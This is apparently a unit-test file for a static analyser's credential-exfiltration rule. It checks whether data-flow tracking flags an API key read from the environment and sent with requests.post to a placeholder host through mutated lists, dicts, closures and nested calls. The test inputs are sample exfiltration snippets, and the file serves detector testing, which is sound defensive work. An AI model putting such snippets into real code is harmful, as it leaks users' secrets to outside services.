"""Proven calls propagate bounded mutable effects; speculative calls stay isolated."""

import unittest
from test_qindun_certify import MODULE


class PythonCallMutationTests(unittest.TestCase):

    def test_public_auth_and_mixed_payloads_remain_distinct(self):
        for initial, mutation, expected in (
            ('[]', 'value.append("public")', set()),
            ('{}', 'value["Authorization"]="Bearer "+secret', {"candidate"}),
            ('{}', 'value["Authorization"]="Bearer "+secret\n    value["body"]=secret',
             {"confirmed"}),
        ):
            with self.subTest(initial=initial, mutation=mutation):
                self.analyze(
                    f'fields={initial}\ndef change(value,secret):\n    {mutation}\n'
                    'change(fields,key)\nrequests.post("https://service.invalid",headers=fields)\n',
                    expected,
                )

    def test_literal_argument_expansion_preserves_container_reference(self):
        for call in ('change(*(fields,key))', 'change(**{"value":fields,"secret":key})'):
            with self.subTest(call=call):
                self.analyze(
                    'fields=[]\ndef change(value,secret):\n    value.append(secret)\n'
                    + call + '\nrequests.post("https://service.invalid",json=fields)\n',
                    {"confirmed"},
                )

    def test_closure_mutates_live_parent_container(self):
        self.analyze(
            'def outer():\n    fields=[]\n    def inner():\n        fields.append(key)\n'
            '    inner()\n    requests.post("https://service.invalid",json=fields)\nouter()\n',
            {"confirmed"},
        )

    def analyze(self, body, expected):
        source = 'import os,requests\nkey=os.getenv("API_KEY")\n' + body
        hits, error = MODULE._python_flow_findings("main.py", source)
        self.assertIsNone(error)
        actual = {hit.disposition for hit in hits
                  if hit.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION"}
        self.assertEqual(actual, expected)

    def test_explicit_argument_mutations(self):
        for initial, mutation in (
            ('{}', 'value["payload"]=secret'),
            ('[]', 'value.append(secret)'),
            ('{1}', 'value.add(secret)'),
        ):
            for signature, call in (
                ("value,secret", "change(fields,key)"),
                ("value,secret", "change(secret=key,value=fields)"),
                ("value,/,secret", "change(fields,secret=key)"),
                ("*,value,secret", "change(value=fields,secret=key)"),
            ):
                with self.subTest(initial=initial, signature=signature, call=call):
                    self.analyze(
                        f'fields={initial}\ndef change({signature}):\n    {mutation}\n'
                        f'{call}\nrequests.post("https://service.invalid",json=fields)\n',
                        {"confirmed"},
                    )

    def test_global_object_mutation_only_after_invocation(self):
        for call, expected in (("change()\n", {"confirmed"}), ("", set())):
            with self.subTest(call=call):
                self.analyze(
                    'fields={}\ndef change():\n    fields["payload"]=key\n'
                    + call + 'requests.post("https://service.invalid",json=fields)\n',
                    expected,
                )

    def test_parameter_rebinding_leaves_caller_and_old_alias_unchanged(self):
        for mutation in ('value={"payload":secret}', 'value=[]\n    value.append(secret)'):
            with self.subTest(mutation=mutation):
                self.analyze(
                    'fields={}\ndef change(value,secret):\n    ' + mutation + '\n'
                    'change(fields,key)\nrequests.post("https://service.invalid",json=fields)\n',
                    set(),
                )

    def test_same_argument_object_keeps_alias_identity_inside_callee(self):
        self.analyze(
            'fields={}\ndef change(left,right):\n    left["payload"]=key\n'
            '    requests.post("https://service.invalid",json=right)\nchange(fields,fields)\n',
            {"confirmed"},
        )

    def test_nested_call_forwards_caller_object(self):
        self.analyze(
            'fields=[]\ndef inner(value,secret):\n    value.append(secret)\n'
            'def outer(value,secret):\n    inner(value,secret)\n'
            'outer(fields,key)\nrequests.post("https://service.invalid",json=fields)\n',
            {"confirmed"},
        )

    def test_defaults_keep_definition_time_object(self):
        for body, expected in (
            ('change()\nrequests.post("https://service.invalid",json=fields)\n', {"confirmed"}),
            ('fields={}\nchange()\nrequests.post("https://service.invalid",json=fields)\n', set()),
            ('fields={}\nchange()\nrequests.post("https://service.invalid",json=old)\n', {"confirmed"}),
            ('requests.post("https://service.invalid",json=fields)\n', set()),
        ):
            with self.subTest(body=body):
                self.analyze(
                    'fields={}\nold=fields\ndef change(value=fields):\n    value["payload"]=key\n'
                    + body, expected,
                )

    def test_return_prevents_later_mutation(self):
        self.analyze(
            'fields={}\ndef change(value):\n    return\n    value["payload"]=key\n'
            'change(fields)\nrequests.post("https://service.invalid",json=fields)\n',
            set(),
        )

    def test_repeated_calls_mutate_new_objects_despite_equal_input_flags(self):
        self.analyze(
            'def change(value):\n    value.append(key)\n'
            'first=[]\nchange(first)\nsecond=[]\nchange(second)\n'
            'requests.post("https://service.invalid",json=second)\n',
            {"confirmed"},
        )

    def test_uncalled_wrapper_cannot_mutate_global_object_through_called_helper(self):
        self.analyze(
            'fields=[]\ndef inner(value):\n    value.append(key)\n'
            'def unused():\n    inner(fields)\n'
            'requests.post("https://service.invalid",json=fields)\n',
            set(),
        )
